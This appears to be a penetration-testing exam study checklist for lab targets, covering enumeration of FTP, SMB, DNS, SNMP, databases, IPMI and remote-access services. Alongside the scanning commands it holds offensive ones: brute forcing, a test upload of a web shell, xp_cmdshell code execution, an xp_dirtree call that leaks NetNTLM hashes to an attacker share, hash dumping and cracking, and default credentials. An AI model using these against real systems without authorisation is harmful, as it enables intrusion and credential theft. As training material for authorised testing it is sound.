# 1 — ENUMERATION  (Footprinting + Scanning)

> Goal: from an IP to a full map of **every open port + service version + the cheap win on each**.
> Every checklist point has **its own command, taken from your CPTS notes**. Tick as you go.
> `export IP=10.129.x.x` · `export DOMAIN=inlanefreight.local` first.

---

## A. Host discovery (only if given a range/subnet)

- [ ] **ICMP sweep** — `fping -asgq 10.129.0.0/23`
- [ ] **Ping-scan map** — `nmap -sn 10.129.0.0/23 -oA hosts`
- [ ] **ARP scan** (same L2 only) — `sudo arp-scan -l`
- [ ] Add every host to `/etc/hosts`

📓 `[[../footprinting/02-enumeration-methodology]]`

---

## B. Port scan (every host)

- [ ] **All TCP, fast** — `nmap -p- --min-rate 1000 -T4 $IP -oA nmap/all-tcp`
- [ ] **Version + scripts on open ports** —
  ```bash
  ports=$(grep open nmap/all-tcp.nmap | cut -d/ -f1 | tr '\n' ',')
  nmap -p$ports -sCV -oA nmap/tcp-deep $IP
  ```
- [ ] **UDP top-100** — `sudo nmap -sU --top-ports 100 $IP -oA nmap/udp`
- [ ] **Manual banner confirm** — `nc -nv $IP <port>`

📓 `[[../nmap/00-METHODOLOGY]]`

---

## C. Vuln search (run for EVERY service version)

- [ ] `searchsploit <product> <version>`
- [ ] `msfconsole -q -x "search <product>; exit"`
- [ ] Google `"<product> <version> exploit github"`
- [ ] Re-read nmap NSE output for misconfig (anon login, null session)
- [ ] Found something → log it now → `[[08-REPORT]]`

---

# Per-service checklists — command on every point

---

## 🔹 FTP — 21

- [ ] **Banner** — `nc -nv $IP 21`  ·  TLS: `openssl s_client -connect $IP:21 -starttls ftp`
- [ ] **Version + scripts** — `sudo nmap -sV -p21 -sC -A $IP`
- [ ] **Anonymous login** — `ftp $IP`  → `anonymous` / `anonymous`
- [ ] **Recursive list** (if allowed) — `ftp> ls -R`
- [ ] **Mirror everything** — `wget -m --no-passive ftp://anonymous:anonymous@$IP`
- [ ] **Brute** (only after defaults) — `hydra -L users.txt -P pass.txt -f ftp://$IP`
- [ ] Upload test — `ftp> put shell.php` → does it hit a webroot?

📓 enum `[[../footprinting/06-ftp]]` · attack `[[../common-services/06-ftp-latest-vulns]]`
<details><summary>▸ lab refs</summary>`[[../footprinting/19-lab-easy]]` / `[[../footprinting/20-lab-medium]]`</details>

---

## 🔹 SMB — 139/445

- [ ] **Version + scripts** — `sudo nmap $IP -sV -sC -p139,445`
- [ ] **Null-session share list** — `smbclient -N -L //$IP`  ·  `crackmapexec smb $IP --shares -u '' -p ''`
- [ ] **Connect a share** — `smbclient //$IP/<share>`  → `ls`, `get <file>`, `!<localcmd>`
- [ ] **Perms overview** — `smbmap -H $IP`
- [ ] **RPC null session** — `rpcclient -U "" $IP`  → `srvinfo`, `enumdomains`, `querydominfo`, `netshareenumall`, `enumdomusers`
- [ ] **RID brute** —
  ```bash
  for i in $(seq 500 1100); do rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
  ```
- [ ] **Automated full recon** — `enum4linux-ng -A $IP`
- [ ] **EternalBlue check** — `nmap -p445 --script smb-vuln-ms17-010 $IP`
- [ ] Got creds later → re-run authed, watch for `(Pwn3d!)`

📓 enum `[[../footprinting/07-smb]]` · attack `[[../common-services/07-attacking-smb]]` · CVEs `[[../common-services/08-smb-latest-vulns]]`
<details><summary>▸ lab refs</summary>`[[../common-services/17-skills-assessment-easy]]` — share crawl → creds</details>

---

## 🔹 NFS — 111/2049

- [ ] **Enumerate** — `sudo nmap --script nfs* $IP -sV -p111,2049`
- [ ] **List exports** — `showmount -e $IP`
- [ ] **Mount** — `mkdir target-NFS && sudo mount -t nfs $IP:/ ./target-NFS/ -o nolock`
- [ ] **View files (names)** — `ls -l target-NFS/`
- [ ] **View numeric UID/GID** (key for lateral) — `ls -n target-NFS/`
- [ ] Unmount — `sudo umount ./target-NFS`
- [ ] `no_root_squash`? → privesc later → `[[04-POST-LINUX]]`

📓 `[[../footprinting/08-nfs]]`

---

## 🔹 DNS — 53

- [ ] **List NS** — `dig ns $DOMAIN @$IP`
- [ ] **All records** — `dig any $DOMAIN @$IP`
- [ ] **BIND version** — `dig CH TXT version.bind $IP`
- [ ] **Zone transfer (the big win)** — `dig axfr $DOMAIN @$IP`  ·  internal too: `dig axfr internal.$DOMAIN @$IP`
- [ ] **Subdomain brute** —
  ```bash
  dnsenum --dnsserver $IP --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt $DOMAIN
  ```
- [ ] **Admin email** — `dig soa $DOMAIN` (first field, `.`→`@`)
- [ ] Add discovered names → `/etc/hosts`

📓 enum `[[../footprinting/09-dns]]` · attack `[[../common-services/13-attacking-dns]]` · CVEs `[[../common-services/14-dns-latest-vulns]]`

---

## 🔹 SNMP — 161/udp

- [ ] **Try `public`** — `snmpwalk -v2c -c public $IP`
- [ ] **Community brute** — `onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt $IP`
- [ ] **Walk with found community** — `snmpwalk -v2c -c <community> $IP`
- [ ] **Brute OIDs** — `braa <community>@$IP:.1.3.6.*`
- [ ] Mine output → users, processes, software, creds-in-strings

📓 `[[../footprinting/12-snmp]]`

---

## 🔹 SMTP — 25

- [ ] **Banner + commands** — `sudo nmap $IP -sC -sV -p25`
- [ ] **Manual session** — `telnet $IP 25` → `EHLO x`
- [ ] **User probe** — `VRFY <user>`  /  `RCPT TO: <user@domain>`
- [ ] **Scripted user enum** — `smtp-user-enum -M RCPT -U users.txt -D $DOMAIN -t $IP`
- [ ] **Open-relay test** — `sudo nmap $IP -p25 --script smtp-open-relay -v`

📓 `[[../footprinting/10-smtp]]` · attack `[[../common-services/15-attacking-email-services]]` · CVEs `[[../common-services/16-email-latest-vulns]]`

---

## 🔹 IMAP / POP3 — 143,993 / 110,995

- [ ] **Discover + cert** — `sudo nmap $IP -sV -p110,143,993,995 -sC`
- [ ] **List folders (creds)** — `curl -k 'imaps://'$IP --user <user>:<pass> -v`
- [ ] **Manual IMAPS** — `openssl s_client -connect $IP:imaps`
- [ ] **Manual POP3S** — `openssl s_client -connect $IP:pop3s`

📓 `[[../footprinting/11-imap-pop3]]`

---

## 🔹 MySQL — 3306

- [ ] **Enumerate** — `sudo nmap $IP -sV -sC -p3306 --script mysql*` (verify by hand!)
- [ ] **Connect** — `mysql -u <user> -p<password> -h $IP`  (no space after `-p`)
- [ ] **Loot** — `show databases;` → `use <db>;` → `show tables;` → `select * from <table>;`
- [ ] **Version** — `select version();`

📓 `[[../footprinting/13-mysql]]`

---

## 🔹 MSSQL — 1433

- [ ] **NSE sweep** —
  ```bash
  sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-ntlm-info,ms-sql-hasdbaccess,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password= -sV -p1433 $IP
  ```
- [ ] **Connect** — `impacket-mssqlclient <user>@$IP -windows-auth`
- [ ] **RCE** — `enable_xp_cmdshell` → `xp_cmdshell whoami`
- [ ] **Steal NetNTLM** (responder up) — `EXEC master..xp_dirtree '\\$ATTACKER\share\'`
- [ ] **DBs** — `select name from sys.databases`

📓 `[[../footprinting/14-mssql]]` · attack `[[../common-services/02-attack-concept]]`

---

## 🔹 Oracle TNS — 1521

- [ ] **Discover** — `sudo nmap -p1521 -sV $IP --open`
- [ ] **SID brute** — `sudo nmap -p1521 -sV $IP --open --script oracle-sid-brute`
- [ ] **ODAT all** — `python3 odat.py all -s $IP`
- [ ] **Connect** — `sqlplus <user>/<pass>@$IP/<SID>`  (admin: ` as sysdba`)
- [ ] **Default pairs** — `scott/tiger`, `dbsnmp/dbsnmp`, `system/CHANGE_ON_INSTALL`, `sys/<pw>`
- [ ] **Hashes** — `select name, password from sys.user$;`
- [ ] **File upload RCE** — `./odat.py utlfile -s $IP -d <SID> -U <u> -P <p> --sysdba --putFile <dir> <name> <localfile>`

📓 `[[../footprinting/15-oracle-tns]]`

---

## 🔹 IPMI — 623/udp

- [ ] **Version** — `sudo nmap -sU --script ipmi-version -p623 $IP`
- [ ] **Dump hashes** — `msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts $IP; run"`
- [ ] **Crack** — `hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt`
- [ ] **HP iLO factory mask** — `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`

📓 `[[../footprinting/16-ipmi]]`

---

## 🔹 SSH — 22

- [ ] **Audit** — `ssh-audit $IP`
- [ ] **Allowed auth methods** — `ssh -v <user>@$IP`
- [ ] **Force password (for brute)** — `ssh <user>@$IP -o PreferredAuthentications=password`
- [ ] Brute → `[[../login-brute-forcing/00-METHODOLOGY]]`

📓 `[[../footprinting/17-linux-remote-mgmt]]`

---

## 🔹 Rsync — 873

- [ ] **Fingerprint** — `sudo nmap -sV -p873 $IP`
- [ ] **List shares** — `nc -nv $IP 873` → `@RSYNCD: <ver>` → `#list`
- [ ] **List a share** — `rsync -av --list-only rsync://$IP/<share>`
- [ ] **Pull share** — `rsync -av rsync://$IP/<share>`  (over SSH: `-e ssh`)

📓 `[[../footprinting/17-linux-remote-mgmt]]`

---

## 🔹 R-services — 512/513/514

- [ ] **Fingerprint** — `sudo nmap -sV -p512,513,514 $IP`
- [ ] **Login (trusted .rhosts)** — `rlogin $IP -l <user>`
- [ ] **Logged-in users (LAN)** — `rwho`  ·  detailed: `rusers -al $IP`

📓 `[[../footprinting/17-linux-remote-mgmt]]`

---

## 🔹 RDP / WinRM — 3389 / 5985,5986

- [ ] **Check before connecting** — `nxc winrm $IP -u <user> -p <pass>`
- [ ] **WinRM shell** — `evil-winrm -i $IP -u <user> -p <pass>`
- [ ] **RDP** — `xfreerdp /v:$IP /u:<user> /p:<pass> /dynamic-resolution`

📓 RDP attack `[[../common-services/11-attacking-rdp]]`

---

## ➡️ Where next

- Web port (80/443/8080/8000/8180…) → **`[[02-WEB]]`**
- Creds anywhere → **spray on every host/service** (most flags = reuse) → `[[../00-EXAM-MASTER]]`
- Got RCE → **`[[03-SHELLS]]`**
- Domain/DC (88/389/445/LDAP) → **`[[06-ACTIVE-DIRECTORY]]`**
- **Stuck?** → *"enum done on $IP, here's the nmap + what I tried, what's the priority?"*
